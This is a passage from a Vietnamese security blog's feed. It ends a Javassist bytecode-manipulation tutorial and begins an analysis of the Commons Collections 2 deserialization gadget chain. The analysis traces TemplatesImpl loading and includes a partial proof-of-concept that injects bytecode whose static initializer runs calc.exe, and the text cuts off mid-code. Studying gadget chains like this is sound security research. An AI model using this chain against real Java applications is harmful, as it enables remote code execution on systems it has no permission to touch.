org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*ClassPool pool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">        CtClass ctClass = pool.makeClass(&quot;Test&quot;);</span></span><br><span class="line"><span class="comment">        CtField testField = new CtField(CtClass.intType, &quot;TestField&quot;, ctClass);</span></span><br><span class="line"><span class="comment">        testField.setModifiers(Modifier.PRIVATE);</span></span><br><span class="line"><span class="comment">        ctClass.addField(testField);</span></span><br><span class="line"><span class="comment">        ctClass.writeFile(&quot;/Users/rayin_awarf/Desktop&quot;);*/</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">TestClass</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/rayin_awarf/Desktop/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">toBeDeleted</span> <span class="operator">=</span> TestClass.getField(<span class="string">&quot;TestField&quot;</span>);</span><br><span class="line">        TestClass.removeField(toBeDeleted);</span><br><span class="line">        TestClass.toClass();</span><br><span class="line">        TestClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop/test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Phương thức này sẽ không thay đổi file hệ thống nếu như không sử dụng writeFile, tuy nhiên nó sẽ có tác dụng trong quá trình chạy:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*ClassPool pool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">        CtClass ctClass = pool.makeClass(&quot;Test&quot;);</span></span><br><span class="line"><span class="comment">        CtField x = new CtField(CtClass.intType, &quot;x&quot;, ctClass);</span></span><br><span class="line"><span class="comment">        ctClass.addField(x);</span></span><br><span class="line"><span class="comment">        ctClass.writeFile(&quot;/Users/rayin_awarf/Desktop&quot;);*/</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        ClassPool pool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">        CtClass TestClass = pool.makeClass(new FileInputStream(&quot;/Users/rayin_awarf/Desktop/Test.class&quot;));</span></span><br><span class="line"><span class="comment">        CtField toBeDeleted = TestClass.getField(&quot;TestField&quot;);</span></span><br><span class="line"><span class="comment">        TestClass.removeField(toBeDeleted);</span></span><br><span class="line"><span class="comment">        TestClass.toClass();</span></span><br><span class="line"><span class="comment">        TestClass.writeFile(&quot;/Users/rayin_awarf/Desktop/test&quot;);/*</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//Point point = new Point();</span></span><br><span class="line">        <span class="comment">//System.out.println(point.x);</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">TestClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;org.example.Point&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">toBeDeleted</span> <span class="operator">=</span> TestClass.getField(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        TestClass.removeField(toBeDeleted);</span><br><span class="line">        TestClass.toClass();</span><br><span class="line">        <span class="type">Point</span> <span class="variable">pointAfterRemove</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Point</span>();</span><br><span class="line">        System.out.println(pointAfterRemove.x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tuy file Point.java của chúng ta không mất trường x, tuy nhiên khi chúng ta sử dụng nó trong quá trình chạy file App.java, lớp Point trong thời gian chạy không tồn tại biến x nên lỗi <code>Exception in thread &quot;main&quot; java.lang.NoSuchFieldError: x</code> xuất hiện.</p><h3 id="Them-phuong-thuc-vao-class"><a href="#Them-phuong-thuc-vao-class" class="headerlink" title="Thêm phương thức vào class"></a>Thêm phương thức vào class</h3><p>Ta có thể tạo phương thức bằng <code>new CtMethod()</code> hoặc <code>CtNewMethod.make()</code> rồi thực hiện <code>addMethod</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">xField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;x&quot;</span>, ctClass);</span><br><span class="line">        xField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">yField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;y&quot;</span>, ctClass);</span><br><span class="line">        yField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(xField);</span><br><span class="line">        ctClass.addField(yField);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">getX</span> <span class="operator">=</span> CtNewMethod.make(Modifier.PUBLIC, CtClass.intType, <span class="string">&quot;getX&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;return x;&quot;</span>, ctClass);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">getY</span> <span class="operator">=</span> CtNewMethod.make(Modifier.PUBLIC, CtClass.intType, <span class="string">&quot;getY&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;return y;&quot;</span>, ctClass);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">setX</span> <span class="operator">=</span> CtNewMethod.make(Modifier.PUBLIC, CtClass.voidType, <span class="string">&quot;setX&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[] &#123; CtClass.intType &#125;, <span class="literal">null</span>, <span class="string">&quot;x = $1;&quot;</span>, ctClass);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">setY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;setY&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[] &#123; CtClass.intType &#125;, ctClass);</span><br><span class="line">        setY.setBody(<span class="string">&quot;&#123; y = $1; &#125;&quot;</span>);</span><br><span class="line">        ctClass.addMethod(getX);</span><br><span class="line">        ctClass.addMethod(getY);</span><br><span class="line">        ctClass.addMethod(setX);</span><br><span class="line">        ctClass.addMethod(setY);</span><br><span class="line">        <span class="comment">//Object obj = ctClass.toClass().newInstance();</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;Class Name : &quot; + obj.getClass());</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Them-method-va-goi-method-tu-mot-class"><a href="#Them-method-va-goi-method-tu-mot-class" class="headerlink" title="Thêm method và gọi method từ một class"></a>Thêm method và gọi method từ một class</h3><p>Chúng ta không thể gọi trực tiếp sau khi thêm vào mà phải gọi thông qua reflection.</p><p><em>Point.java</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>App.java</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;org.example.Point&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">helloWorld</span> <span class="operator">=</span> CtNewMethod.make(Modifier.PUBLIC, CtClass.voidType, <span class="string">&quot;helloWorld&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;System.out.println(\&quot;Hello world!\&quot;);&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(helloWorld);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;Greeting: &quot;</span>);</span><br><span class="line">        <span class="type">Point</span> <span class="variable">point</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Point</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> point.getClass().getMethod(<span class="string">&quot;helloWorld&quot;</span>);</span><br><span class="line">        method.invoke(point);</span><br><span class="line">        <span class="comment">//ctClass.writeFile(&quot;/Users/rayin_awarf/Desktop&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Tao-mot-interface"><a href="#Tao-mot-interface" class="headerlink" title="Tạo một interface"></a>Tạo một interface</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeInterface(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.intType, <span class="string">&quot;sum&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[] &#123; CtClass.intType, CtClass.intType &#125;,</span><br><span class="line">                ctClass);</span><br><span class="line">        sum.setBody(<span class="string">&quot;return $1 + $2;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">areaOfCircle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.doubleType, <span class="string">&quot;areaOfCircle&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[] &#123; CtClass.doubleType &#125;,</span><br><span class="line">                ctClass);</span><br><span class="line">        ctClass.addMethod(sum);</span><br><span class="line">        ctClass.addMethod(areaOfCircle);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="insertClassPath"><a href="#insertClassPath" class="headerlink" title="insertClassPath"></a>insertClassPath</h3><p>ClassPool.insertClassPath(new ClassClassPath(AbstractTranslet.class))<br>Hàm này dùng để điều chỉnh CLASSPATH</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Để chạy một chương trình Java chúng ta cần trải qua hai bước:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bước một: compile file text format(.java) sang file Java bytec</summary>
      
    
    
    
    <category term="Java" scheme="https://rayinaw.github.io/categories/Java/"/>
    
    <category term="Programming" scheme="https://rayinaw.github.io/categories/Java/Programming/"/>
    
    <category term="Javassist" scheme="https://rayinaw.github.io/categories/Java/Programming/Javassist/"/>
    
    
    <category term="Java" scheme="https://rayinaw.github.io/tags/Java/"/>
    
    <category term="Programming" scheme="https://rayinaw.github.io/tags/Programming/"/>
    
    <category term="Javassist" scheme="https://rayinaw.github.io/tags/Javassist/"/>
    
  </entry>
  
  <entry>
    <title>Phân tích chuỗi Commons Collections 2</title>
    <link href="https://rayinaw.github.io/2022/12/16/CommonsCollections2/"/>
    <id>https://rayinaw.github.io/2022/12/16/CommonsCollections2/</id>
    <published>2022-12-16T03:05:45.000Z</published>
    <updated>2022-12-31T07:35:19.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mot-vai-kien-thuc-can-nam"><a href="#Mot-vai-kien-thuc-can-nam" class="headerlink" title="Một vài kiến thức cần nắm"></a>Một vài kiến thức cần nắm</h2><p>Trước khi vào bài viết chúng ta cần nắm một số kiến thức sau:</p><ul><li>javassist</li></ul><h2 id="Moi-truong"><a href="#Moi-truong" class="headerlink" title="Môi trường"></a>Môi trường</h2><ul><li>JDK8u65</li><li>Commons-Collections 4.0<br>Thêm Commons-Collections 4.0 vào project bằng dependencies:<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><h3 id="Tu-TemplateImpl-den-OS-Command"><a href="#Tu-TemplateImpl-den-OS-Command" class="headerlink" title="Từ TemplateImpl đến OS Command"></a>Từ TemplateImpl đến OS Command</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TransletClassLoader.defineClass()</span><br><span class="line">TemplatesImpl.getTransletInstance()-&gt;_class[_transletIndex].newInstance()</span><br><span class="line">Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure><p>Trong lớp TemplateImpl tìm đến phương thức TemplateImpl.newTransformer(). Trong phương thức này nó gọi đến TemplateImpl.getTranslateInstance(). Đi đến phương thức này.<br>![][TemplateImpl.newTransformer()]<br>Trong phương thức này, chúng ta cần quan tâm đến phương thức TemplateImpl.defineTransletClasses(). Nếu _name không null và _class null thì nó sẽ gọi đến TemplateImpl.defineTransletClasses(). Hai biến này hiện tại mình vẫn chưa rõ là gì bởi chưa rõ lớp TemplateImpl, lát nữa mình sẽ debug để xem rõ.</p><p>Đi đến phương thức TemplateImpl.defineTransletClasses().<br>Đầu tiên để đi tiếp, chúng ta cần _bytecodes khác null. Trong phương thức này nó thực hiện tạo một TransletClassLoader, TransletClassLoader là một lớp con static của lớp TemplateImpl.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>loader này thực hiện <code>_class[i] = loader.defineClass(_bytecodes[i])</code>, hàm này sẽ thực hiện phương thức defineClass của lớp ClassLoader <code>ClassLoader.defineClass(null, b, 0, b.length)</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">    <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Phương thức này thực hiện chuyển đổi một mảng byte thành một class.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>Lớp được lấy ra gọi đến getSuperClass trả về một super class và lưu vào biến superClass, tên của superClass sẽ được so sánh với “com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet”.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">        <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure><p>Nếu như bằng _transletIndex sẽ được gán bằng i, _Class[i] là class extends AbstractTranslet. Nhảy đến phương thức getTransletInstance, nó thực hiện _class[_transletIndex].newInstance(). Nếu chúng ta chèn mã vào hàm tự động thực thi tnhư hàm tạo, hoặc static thì chúng ta có thể trigger ở chổ này.</p><p>Test thử với POC nhỏ sau.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calc.exe vẫn chưa được kích hoạt, ở đây là do _tfactory chưa được set. _tfactory ở đây là một TransformerFactoryImpl nên chúng ta chỉ cần đặt là <code>new TransformerFactoryImpl()</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 